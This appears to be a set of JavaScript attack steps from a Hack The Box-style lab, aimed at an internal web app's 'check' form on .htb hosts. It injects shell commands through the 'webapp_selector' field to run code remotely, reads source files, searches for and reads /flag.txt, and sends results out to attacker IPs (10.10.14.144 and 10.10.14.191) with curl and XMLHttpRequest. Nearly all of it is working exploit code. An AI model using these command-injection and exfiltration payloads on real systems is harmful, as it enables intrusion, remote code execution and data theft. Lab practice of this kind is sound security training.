// exfil index
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://internal.internal-webapps-2.htb/', false);
xhr.send();

// response:
{/* <form action="/check" method="post">

<div class="container">
    <b>Select the Web Application</b>
    <input type="radio" id="main" name="webapp_selector" value="https://internal-webapps-2.htb">
    <label for="main">internal-webapps-2.htb</label><br>
    <input type="radio" id="internal" name="webapp_selector" value="https://internal.internal-webapps-2.htb">
    <label for="internal">internal.internal-webapps-2.htb</label><br>
    <input type="radio" id="api" name="webapp_selector" value="https://api.internal-webapps-2.htb">
    <label for="api">api.internal-webapps-2.htb</label>

    <button type="submit">Check</button>
</div>
</form> */}

// check how this functionality is implemented
var xhr = new XMLHttpRequest();
var params = `webapp_selector=${encodeURIComponent("https://internal-webapps-2.htb")}`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

// spot the curl error msg in response:
// curl: (7) Failed to connect to internal-webapps-2.htb port 443 after 0 ms: Couldn&#39;t connect to server

// attempt RCE via command injection
var xhr = new XMLHttpRequest();
var params = `webapp_selector=${encodeURIComponent("| curl -k https://10.10.14.144:4443?r=$(whoami)")}`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

// get internal/internal.py
var xhr = new XMLHttpRequest();
var params = "webapp_selector=" + encodeURIComponent("| python3 -c 'import base64,sys;print(base64.b64encode(open(\"internal/internal.py\",\"rb\").read()).decode())'");
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

// look for files with "flag" in filename
var xhr = new XMLHttpRequest();
var params = "webapp_selector=" + encodeURIComponent("| python3 -c 'import base64,subprocess;print(base64.b64encode(subprocess.check_output([\"bash\",\"-lc\",\"find / -type f -iname \\\"*flag*\\\" 2>/dev/null | head -n 100\"]).strip()).decode())'");
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

// found /flag.txt in root dir, read it
var xhr = new XMLHttpRequest();
var params = `webapp_selector=${encodeURIComponent("| cat /flag.txt")}`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

// exfil step
var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.191:4443/exfil?data=" + btoa(xhr.responseText), false);
exfil.send();